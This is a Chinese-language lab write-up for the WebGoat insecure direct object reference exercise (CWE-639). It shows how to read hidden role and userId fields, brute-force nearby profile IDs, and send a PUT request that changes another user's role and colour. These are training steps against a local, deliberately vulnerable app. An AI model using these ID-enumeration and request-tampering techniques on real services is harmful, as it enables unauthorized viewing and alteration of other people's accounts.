---
title: Authenticate First, Abuse Authorization Later
category: CWE-639
---
<!-- muse start -->
水平越权，可能的垂直权限提升。
分析请求与响应中的隐藏字段，基于已知信息对端点及其参数进行推测，基于已知信息尝试不同方法访问端点进行操作。
<!-- muse end -->

概念：
- 首先进行身份认证，随后滥用授权：
    许多访问控制问题容易受到已认证但未授权用户的攻击。

- 观察差异与行为：
    应用安全中从攻击视角出发的一个一贯原则是：关注原始响应与界面显示内容之间的差异。换言之，原始响应中常包含未在屏幕/页面上显示的数据。
    
    请求行 `GET http://localhost:3000/WebGoat/IDOR/profile HTTP/1.1`

    响应
    ```json
    {
        "role" : 3,
        "color" : "yellow",
        "size" : "small",
        "name" : "Tom Cat",
        "userId" : "2342384"
    }
    ```

    差异为 `role` 与 `userId` 字段

- 模式猜测与预测，通过其他方式查看个人资料：
    许多应用存在角色权限机制，高权限用户可访问其他用户的内容。此时，仅使用 /profile 路径将无法生效，因为用户自身的会话/认证数据无法明确指定要查看的目标资料。
    通过直接对象引用显式查看自己的资料 
    `WebGoat/IDOR/profile/2342384`

- 探索访问模式，查看其他用户资料：
    - 通过已掌握的替代路径访问他人资料。使用"查看资料"按钮并拦截/修改请求以实现查看其他资料。或者，也可直接在浏览器中发起手动GET请求。

        基于已知id `2342384`，设置后几位数字爆破，最终得到成功响应的请求
        `GET http://localhost:3000/WebGoat/IDOR/profile/2342388 HTTP/1.1`

    - 修改其他用户资料
        较旧的应用可能采用不同模式，但RESTful应用（当前场景）通常通过变更方法（及是否包含请求主体）实现不同功能。
        运用此原理，在相同基础请求中变更方法、路径和请求主体（payload）以修改其他用户（Buffalo Bill）的资料。将角色权限降至更低（因高权限角色ID通常数值更小）。同时将该用户颜色更改为'red'。

        修改方法为 `PUT` 并按照之前响应的格式设置请求体 JSON 字段
        ```http
        PUT http://localhost:3000/WebGoat/IDOR/profile/2342388 HTTP/1.1
        Content-Type: application/json

        {
            "role" : 1,
            "color" : "red",
            "size" : "small",
            "name" : "Buffalo Bill",
            "userId" : "2342388"
        }
        ```